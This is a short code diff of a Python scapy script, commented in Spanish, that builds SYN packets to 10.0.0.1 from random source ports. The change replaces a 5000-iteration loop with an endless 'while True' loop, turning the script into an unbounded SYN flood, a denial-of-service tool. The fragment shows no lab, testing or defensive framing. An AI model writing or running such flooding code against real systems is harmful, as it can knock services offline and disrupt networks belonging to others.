@@ -4,7 +4,7 @@ from scapy.all import *
 ip = IP(dst="10.0.0.1")
 
 # Loop para enviar múltiples solicitudes SYN
-for i in range(0, 5000):
+while True:
     # Puerto de origen aleatorio para cada conexión
     sport = RandShort()
     # Construir paquete SYN
